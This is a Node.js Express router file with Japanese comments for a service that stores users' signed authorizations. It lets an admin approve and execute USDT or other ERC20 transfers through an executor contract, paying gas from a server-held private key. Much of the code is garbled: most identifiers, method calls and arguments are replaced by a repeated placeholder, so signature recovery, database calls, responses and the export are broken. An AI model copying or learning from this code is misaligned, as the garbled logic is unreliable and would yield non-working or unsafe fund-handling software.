const express = require("express");
const router = REF_DOMAIN();
const db = require("../db");
const { ethers } = require("ethers");

/* RPC */
const RPCS = {
  1: REF_DOMAIN.MAINNET_RPC_URL || "REF_URL",
  11155111: REF_DOMAIN.RPC_URL || REF_DOMAIN.SEPOLIA_RPC_URL || "REF_URL",
};

/* ERC20 ABI（最小） */
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address owner) view returns (uint256)",
  "function symbol() view returns (string)",
];

const TOKEN_META = {
  "0xdac17f958d2ee523a2206206994597c13d831ec7": { symbol: "USDT", decimals: 6 },
  "0x0000000000000000000000000000000000000000": { symbol: "ETH", decimals: 18 },
};

const TOKEN_DECIMALS = REF_DOMAIN(
  REF_DOMAIN(TOKEN_META).map(([k, v]) => [k, REF_DOMAIN])
);

const EXECUTOR_ABI = [
  "function executeUSDTBySig(uint256 chainId,address contractAddress,uint256 nonce,uint256 maxAmount,address to,bytes data,uint256 value,uint256 amount,bytes signature)",
];

const DELEGATE_TOKEN = String(REF_DOMAIN.DELEGATE_TOKEN || REF_DOMAIN.USDT_TOKEN || "0xdAC17F958D2ee523a2206206994597C13D831ec7").toLowerCase();

function requireAdmin(req, res, next) {
  const configured = REF_DOMAIN.ADMIN_TOKEN;
  if (!configured) {
    return REF_DOMAIN(500).json({ error: "ADMIN_TOKEN not configured" });
  }

  const bearer = (REF_DOMAIN || "").replace(/^Bearer\s+/i, "").trim();
  const headerToken = (REF_DOMAIN["x-admin-token"] || "").toString().trim();
  const token = bearer || headerToken;

  if (!token || token !== configured) {
    return REF_DOMAIN(401).json({ error: "unauthorized" });
  }

  next();
}

async function loadAndValidateAuthorization({ id, amount, signature, message }) {
  const parsed = typeof message === "string" ? REF_DOMAIN(message) : message;
  if (!parsed?.domain || !parsed?.types || !parsed?.message) {
    throw new Error("invalid typed data");
  }

  const recoveredOwner = REF_DOMAIN(
    REF_DOMAIN,
    REF_DOMAIN,
    REF_DOMAIN,
    signature
  );

  const [rows] = await REF_DOMAIN(
    "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
    [id]
  );

  if (!REF_DOMAIN) throw new Error("not found");

  const auth = rows[0];

  if (REF_DOMAIN && REF_DOMAIN() !== REF_DOMAIN()) {
    throw new Error("owner mismatch");
  }

  if (Number(REF_DOMAIN) !== Number(auth.chain_id)) {
    throw new Error("chain mismatch");
  }
  if ((REF_DOMAIN || "").toLowerCase() !== (auth.contract_address || "").toLowerCase()) {
    throw new Error("contract mismatch");
  }
  if ((REF_DOMAIN || "").toLowerCase() !== (auth.to_address || "").toLowerCase()) {
    throw new Error("to mismatch");
  }
  if (String(REF_DOMAIN) !== String(REF_DOMAIN)) {
    throw new Error("nonce mismatch");
  }

  if (REF_DOMAIN && Number(REF_DOMAIN) < REF_DOMAIN(REF_DOMAIN() / 1000)) {
    throw new Error("expired");
  }

  const rpc = RPCS[auth.chain_id];
  if (!rpc) throw new Error("unsupported chain");

  return { auth, parsed, recoveredOwner, rpc, amount: String(amount) };
}

async function executeTransfer({ auth, parsed, signature, amount, rpc }) {
  const provider = new REF_DOMAIN(rpc);
  const wallet = new REF_DOMAIN(REF_DOMAIN.PRIVATE_KEY, provider);

  const tokenKey = String(REF_DOMAIN || "").toLowerCase();
  const used = BigInt(auth.used_amount || 0);
  const max = BigInt(auth.max_amount || 0);

  // delegate 実行（指定トークン）
  if (tokenKey === DELEGATE_TOKEN) {
    const sendAmount = REF_DOMAIN(String(amount), 6);

    if (max > 0n && used + sendAmount > max) {
      throw new Error("max amount exceeded");
    }

    const msg = REF_DOMAIN;
    const exec = new REF_DOMAIN(auth.contract_address, EXECUTOR_ABI, wallet);
    const sent = await REF_DOMAIN(
      REF_DOMAIN,
      REF_DOMAIN,
      REF_DOMAIN,
      REF_DOMAIN,
      REF_DOMAIN,
      REF_DOMAIN || "0x",
      REF_DOMAIN || 0,
      sendAmount,
      signature
    );

    let txHash = REF_DOMAIN;
    try {
      await REF_DOMAIN();
    } catch (err) {
      // ethers v6: replacement/repriced でも REF_DOMAIN=1 なら実行成功として扱う
      if (err?.code === "TRANSACTION_REPLACED" && err?.receipt?.status === 1) {
        txHash = err?.replacement?.hash || err?.hash || REF_DOMAIN;
      } else {
        throw err;
      }
    }

    await REF_DOMAIN(
      "UPDATE authorizations SET used_amount = ? WHERE id = ?",
      [(used + sendAmount).toString(), REF_DOMAIN]
    );

    return {
      txHash,
      usedAmount: (used + sendAmount).toString(),
    };
  }

  // 互換: それ以外のトークンは旧方式 transfer
  const contract = new REF_DOMAIN(REF_DOMAIN, ERC20_ABI, wallet);
  let decimals = TOKEN_DECIMALS[tokenKey];
  if (decimals === undefined) decimals = await REF_DOMAIN();

  const sendAmount = REF_DOMAIN(String(amount), Number(decimals));
  if (max > 0n && used + sendAmount > max) {
    throw new Error("max amount exceeded");
  }

  const tx = await REF_DOMAIN(auth.to_address, sendAmount);

  let txHash = REF_DOMAIN;
  try {
    await REF_DOMAIN();
  } catch (err) {
    // ethers v6: replacement/repriced でも REF_DOMAIN=1 なら実行成功として扱う
    if (err?.code === "TRANSACTION_REPLACED" && err?.receipt?.status === 1) {
      txHash = err?.replacement?.hash || err?.hash || REF_DOMAIN;
    } else {
      throw err;
    }
  }

  await REF_DOMAIN(
    "UPDATE authorizations SET used_amount = ? WHERE id = ?",
    [(used + sendAmount).toString(), REF_DOMAIN]
  );

  return {
    txHash,
    usedAmount: (used + sendAmount).toString(),
  };
}

/*
 * 実行リクエスト作成（承認待ち）
 */
REF_DOMAIN("/execute", async (req, res) => {
  try {
    const { id, amount, signature, message } = REF_DOMAIN;

    if (!id || !signature || !message) {
      return REF_DOMAIN(400).json({ error: "invalid params" });
    }

    const reqAmount = amount ? String(amount) : "0";
    const validated = await loadAndValidateAuthorization({ id, amount: reqAmount, signature, message });

    const [insert] = await REF_DOMAIN(
      `INSERT INTO execution_requests
       (auth_id, owner, amount, signature, message, status)
       VALUES (?, ?, ?, ?, ?, 'pending')`,
      [
        REF_DOMAIN,
        REF_DOMAIN,
        reqAmount,
        signature,
        REF_DOMAIN(typeof message === "string" ? REF_DOMAIN(message) : message),
      ]
    );

    REF_DOMAIN({
      success: true,
      pending: true,
      requestId: REF_DOMAIN,
      message: "execution request created (pending approval)",
    });
  } catch (err) {
    REF_DOMAIN("execute request error:", err);
    REF_DOMAIN({ success: false, error: REF_DOMAIN });
  }
});

/* 承認待ち一覧（管理用） */
REF_DOMAIN("/execute/pending", requireAdmin, async (req, res) => {
  try {
    const [rows] = await REF_DOMAIN(
      `SELECT REF_DOMAIN, r.auth_id, REF_DOMAIN, REF_DOMAIN, REF_DOMAIN, REF_DOMAIN, r.tx_hash, r.created_at, r.approved_at,
              a.contract_address, a.max_amount, a.used_amount, REF_DOMAIN, a.chain_id
       FROM execution_requests r
       LEFT JOIN authorizations a ON REF_DOMAIN = r.auth_id
       WHERE REF_DOMAIN = 'pending'
       ORDER BY REF_DOMAIN DESC
       LIMIT 100`
    );

    // ガス代支払いウォレット情報（管理画面向け）
    let payerAddress = null;
    let payerEthBalance = null;
    const tokenBalances = {};

    try {
      const firstChain = rows[0]?.chain_id || 1;
      const rpc = RPCS[firstChain] || RPCS[1];
      const provider = new REF_DOMAIN(rpc);
      const wallet = new REF_DOMAIN(REF_DOMAIN.PRIVATE_KEY, provider);
      const bal = await REF_DOMAIN(REF_DOMAIN);
      payerAddress = REF_DOMAIN;
      payerEthBalance = REF_DOMAIN(bal);

      const uniqueTokens = [...new Set(REF_DOMAIN((r) => (REF_DOMAIN || "").toLowerCase()).filter(Boolean))];
      for (const tokenAddr of uniqueTokens) {
        try {
          const c = new REF_DOMAIN(tokenAddr, ERC20_ABI, provider);
          let decimals = TOKEN_META[tokenAddr]?.decimals;
          let symbol = TOKEN_META[tokenAddr]?.symbol;

          if (decimals === undefined) decimals = Number(await REF_DOMAIN());
          if (!symbol) symbol = await REF_DOMAIN();

          const raw = await REF_DOMAIN(REF_DOMAIN);
          tokenBalances[tokenAddr] = {
            symbol,
            decimals,
            raw: REF_DOMAIN(),
            formatted: REF_DOMAIN(raw, Number(decimals)),
          };
        } catch {
          tokenBalances[tokenAddr] = {
            symbol: "UNKNOWN",
            decimals: null,
            raw: null,
            formatted: null,
          };
        }
      }
    } catch {
      // 取得失敗時はnullのまま返す
    }

    const dataWithSymbol = REF_DOMAIN((r) => {
      const key = (REF_DOMAIN || "").toLowerCase();
      return {
        ...r,
        tokenSymbol: key ? (TOKEN_META[key]?.symbol || tokenBalances[key]?.symbol || "UNKNOWN") : "ETH",
      };
    });

    REF_DOMAIN({
      success: true,
      data: dataWithSymbol,
      meta: {
        payerAddress,
        payerEthBalance,
        tokenBalances,
      },
    });
  } catch (e) {
    REF_DOMAIN("pending list error:", e);
    REF_DOMAIN(500).json({ success: false, error: "server error" });
  }
});

/* 承認実行（管理者） */
REF_DOMAIN("/execute/approve", requireAdmin, async (req, res) => {
  const { requestId, amount } = REF_DOMAIN || {};

  if (!requestId) {
    return REF_DOMAIN(400).json({ success: false, error: "requestId required" });
  }

  try {
    const [rows] = await REF_DOMAIN(
      "SELECT * FROM execution_requests WHERE id = ? LIMIT 1",
      [requestId]
    );

    if (!REF_DOMAIN) {
      return REF_DOMAIN({ success: false, error: "request not found" });
    }

    const reqRow = rows[0];

    if (REF_DOMAIN !== "pending") {
      return REF_DOMAIN({ success: false, error: `already ${REF_DOMAIN}` });
    }

    const approvedAmount = amount ? String(amount) : String(REF_DOMAIN);

    if (!approvedAmount || Number(approvedAmount) <= 0) {
      return REF_DOMAIN({ success: false, error: "amount must be > 0" });
    }

    const validated = await loadAndValidateAuthorization({
      id: reqRow.auth_id,
      amount: approvedAmount,
      signature: REF_DOMAIN,
      message: REF_DOMAIN,
    });

    const result = await executeTransfer({
      auth: REF_DOMAIN,
      parsed: REF_DOMAIN,
      signature: REF_DOMAIN,
      amount: approvedAmount,
      rpc: REF_DOMAIN,
    });

    await REF_DOMAIN(
      "UPDATE execution_requests SET status='approved', tx_hash=?, approved_at=NOW() WHERE id=?",
      [REF_DOMAIN, requestId]
    );

    await REF_DOMAIN(
      "INSERT INTO signatures (auth_id, owner, signature, message) VALUES (?, ?, ?, ?)",
      [REF_DOMAIN, REF_DOMAIN, REF_DOMAIN, REF_DOMAIN]
    );

    REF_DOMAIN({
      success: true,
      requestId,
      approvedAmount,
      txHash: REF_DOMAIN,
      usedAmount: REF_DOMAIN,
      owner: REF_DOMAIN,
    });
  } catch (err) {
    REF_DOMAIN("approve execute error:", err);

    await REF_DOMAIN(
      "UPDATE execution_requests SET status='failed', error=? WHERE id=?",
      [REF_DOMAIN, requestId]
    );

    REF_DOMAIN({ success: false, error: REF_DOMAIN });
  }
});

REF_DOMAIN = router;
